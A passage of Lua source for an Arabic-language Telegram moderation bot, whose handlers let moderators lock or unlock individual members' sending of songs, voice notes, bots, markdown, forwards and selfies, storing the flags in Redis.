storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل الاغاني (%d+)') and is_mod(msg)  then    local user = text:match('قفل الاغاني (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockmusc'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockmusc:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الاغاني'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل الاغاني @(.*)') and is_mod(msg) then    local username = text:match('قفل الاغاني @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockmusc'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockmusc:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الاغاني'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح الاغاني' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockmusc'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockmusc:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الاغاني'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح الاغاني (%d+)') and is_mod(msg)  then    local user = text:match('فتح الاغاني (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:del('numlockmusc'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockmusc:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الاغاني'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    getUser(user, bot_kick)   end
if text and text:match('^فتح الاغاني @(.*)') and is_mod(msg) then    local username = text:match('فتح الاغاني @(.*)')    function kick_username(extra,result,success)    if result.id_ then      tahadevstorm:del('numlockmusc'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockmusc:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الاغاني'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")       end   end    saddbyusername(username,kick_username)    end
if text == 'قفل الصوت' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockvico'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockvico:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الصوت'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل الصوت (%d+)') and is_mod(msg)  then    local user = text:match('قفل الصوت (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockvico'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockvico:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الصوت'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل الصوت @(.*)') and is_mod(msg) then    local username = text:match('قفل الصوت @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockvico'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockvico:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الصوت'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح الصوت' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockvico'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockvico:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الصوت'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح الصوت (%d+)') and is_mod(msg)  then    local user = text:match('فتح الصوت (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''     tahadevstorm:del('numlockvico'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockvico:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الصوت'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end   getUser(user, bot_kick)   end    
if text and text:match('^فتح الصوت @(.*)') and is_mod(msg) then    local username = text:match('فتح الصوت @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlockvico'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockvico:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الصوت'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end
if text == 'قفل البوتات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockbotspm'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockbotspm:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن اضافه البوتات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل البوتات (%d+)') and is_mod(msg)  then    local user = text:match('قفل البوتات (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockbotspm'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockbotspm:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن اضافه البوتات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل البوتات @(.*)') and is_mod(msg) then    local username = text:match('قفل البوتات @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockbotspm'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockbotspm:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن اضافه البوتات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح البوتات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockbotspm'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockbotspm:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغاء منعـه مـن اضافه البوتات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end     getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح البوتات (%d+)') and is_mod(msg)  then     local user = text:match('فتح البوتات (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    tahadevstorm:del('numlockbotspm'..msg.chat_id_..user)    tahadevstorm:srem(DEVSTOR..'lockbotspm:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغاء منعـه مـن اضافه البوتات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     getUser(user, bot_kick)    end
if text and text:match('^فتح البوتات @(.*)') and is_mod(msg) then     local username = text:match('فتح البوتات @(.*)')     function kick_username(extra,result,success)     if result.id_ then      tahadevstorm:del('numlockbotspm'..msg.chat_id_..result.id_)    tahadevstorm:srem(DEVSTOR..'lockbotspm:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغاء منعـه مـن اضافه البوتات'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end      end     saddbyusername(username,kick_username)     end
if text == 'قفل الماركداون' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")     else     if tonumber(result.sender_user_id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.sender_user_id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockmark'..msg.chat_id_..result.sender_user_id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockmark:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الماركداون'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^قفل الماركداون (%d+)') and is_mod(msg)  then     local user = text:match('قفل الماركداون (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     if tonumber(user) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,user) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     return false  end       tahadevstorm:incrby('numlockmark'..msg.chat_id_..user,10000000)    tahadevstorm:sadd(DEVSTOR..'lockmark:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الماركداون'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end getUser(user, bot_kick) end     
if text and text:match('^قفل الماركداون @(.*)') and is_mod(msg) then     local username = text:match('قفل الماركداون @(.*)')     function kick_username(extra,result,success)     if result.id_ then      if tonumber(result.id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     else     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     tahadevstorm:incrby('numlockmark'..msg.chat_id_..result.id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockmark:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الماركداون'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end end end     saddbyusername(username,kick_username)     end
if text == 'فتح الماركداون' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     tahadevstorm:del('numlockmark'..msg.chat_id_..result.sender_user_id_)    tahadevstorm:srem(DEVSTOR..'lockmark:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الماركداون'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")       end    getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^فتح الماركداون (%d+)') and is_mod(msg)  then     local user = text:match('فتح الماركداون (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''      tahadevstorm:del('numlockmark'..msg.chat_id_..user)    tahadevstorm:srem(DEVSTOR..'lockmark:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الماركداون'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     getUser(user, bot_kick)    end         
if text and text:match('^فتح الماركداون @(.*)') and is_mod(msg) then     local username = text:match('فتح الماركداون @(.*)')     function kick_username(extra,result,success)     if result.id_ then      tahadevstorm:del('numlockmark'..msg.chat_id_..result.id_)    tahadevstorm:srem(DEVSTOR..'lockmark:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الماركداون'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end      end     saddbyusername(username,kick_username)     end
if text == 'قفل التوجيه' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")     else     if tonumber(result.sender_user_id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.sender_user_id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockfwd'..msg.chat_id_..result.sender_user_id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockfwd:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال التوجيه'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^قفل التوجيه (%d+)') and is_mod(msg)  then     local user = text:match('قفل التوجيه (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     if tonumber(user) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,user) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     return false  end       tahadevstorm:incrby('numlockfwd'..msg.chat_id_..user,10000000)    tahadevstorm:sadd(DEVSTOR..'lockfwd:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال التوجيه'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end getUser(user, bot_kick) end     
if text and text:match('^قفل التوجيه @(.*)') and is_mod(msg) then     local username = text:match('قفل التوجيه @(.*)')     function kick_username(extra,result,success)     if result.id_ then      if tonumber(result.id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     else     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     tahadevstorm:incrby('numlockfwd'..msg.chat_id_..result.id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockfwd:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال التوجيه'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end end end     saddbyusername(username,kick_username)     end
if text == 'فتح التوجيه' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     tahadevstorm:del('numlockfwd'..msg.chat_id_..result.sender_user_id_)    tahadevstorm:srem(DEVSTOR..'lockfwd:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التوجيه'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end      getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^فتح التوجيه (%d+)') and is_mod(msg)  then     local user = text:match('فتح التوجيه (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    tahadevstorm:del('numlockfwd'..msg.chat_id_..user)    tahadevstorm:srem(DEVSTOR..'lockfwd:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التوجيه'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     getUser(user, bot_kick)    end
if text and text:match('^فتح التوجيه @(.*)') and is_mod(msg) then     local username = text:match('فتح التوجيه @(.*)')     function kick_username(extra,result,success)     if result.id_ then      tahadevstorm:del('numlockfwd'..msg.chat_id_..result.id_)    tahadevstorm:srem(DEVSTOR..'lockfwd:ban'..msg.chat_id_,result.id_)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن التوجيه'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end      end     saddbyusername(username,kick_username)     end    
if text == 'قفل السيلفي' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then     function kick_by_reply(extra, result, success)     if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")     else     if tonumber(result.sender_user_id_) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,result.sender_user_id_) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockself'..msg.chat_id_..result.sender_user_id_,160000066)    tahadevstorm:sadd(DEVSTOR..'lockself:ban'..msg.chat_id_,result.sender_user_id_)       zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال السيلفي'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)     end
if text and text:match('^قفل السيلفي (%d+)') and is_mod(msg)  then     local user = text:match('قفل السيلفي (%d+)')      function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    if not msg.can_be_deleted_ == true then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")     else     if tonumber(user) == tonumber(bot_id) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')      return false  end     if storm3(msg.chat_id_,user) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')     return false  end       tahadevstorm:incrby('numlockself'..msg.chat_id_..user,10000000)    tahadevstorm:sadd(DEVSTOR..'lockself:ban'..msg.chat_id_,user)       zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال السيلفي'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end end getUser(user, bot_kick) end     
